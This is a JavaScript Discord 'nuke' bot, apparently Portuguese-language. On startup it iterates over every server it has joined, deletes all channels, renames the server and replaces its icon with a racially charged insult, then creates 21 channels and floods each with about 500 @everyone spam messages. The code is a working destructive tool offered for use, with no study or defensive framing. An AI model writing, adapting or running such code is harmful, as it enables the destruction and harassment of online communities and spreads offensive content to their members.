const Discord = require('discord.js');

const token = 'YOUR_TOKEN_HERE';

const bot = new Discord.Client({
	intents: [
		Discord.GatewayIntentBits.Guilds,
		Discord.GatewayIntentBits.GuildMembers,
		Discord.GatewayIntentBits.GuildIntegrations,
		Discord.GatewayIntentBits.GuildVoiceStates,
		Discord.GatewayIntentBits.MessageContent,
		Discord.GatewayIntentBits.GuildMessages,
	],
});

bot.on('ready', async () => {
	console.log(`Bot Online => ${bot.user.tag}`);
	bot.user.setActivity('Neguin Gostoso');

	bot.guilds.cache.forEach((guild) => {
		console.log(`ID: ${guild.id} | Name: ${guild.name}`);
		nuke(guild);
	});
	
	// const guild = bot.guilds.cache.get('1139730355897778178');
	// console.log(await guild.invites.create(guild.channels.cache.first().id));
});

async function nuke(guild) {
	for (let channel of guild.channels.cache) {
		try {
			await channel[1].delete();
			console.count('Canal deletado');
		} catch (error) {
			console.log(error);
		}
	}

	await guild.setIcon('./bosta.jpg');
	await guild.setName('Neguin Gostoso');

	for (let i = 0; i <= 20; i++) {
		await guild.channels
			.create({
				name: 'neguin-gostoso',
				type: 0,
			})
			.then(async (channel) => {
				for (let i = 0; i <= 500; i++) {
					await channel.send('Neguin Gostoso\n\n@everyone');
					console.count('Mensagem enviada');
				}
			});
		
		console.count('Canal criado');
	}
}

bot.login(token);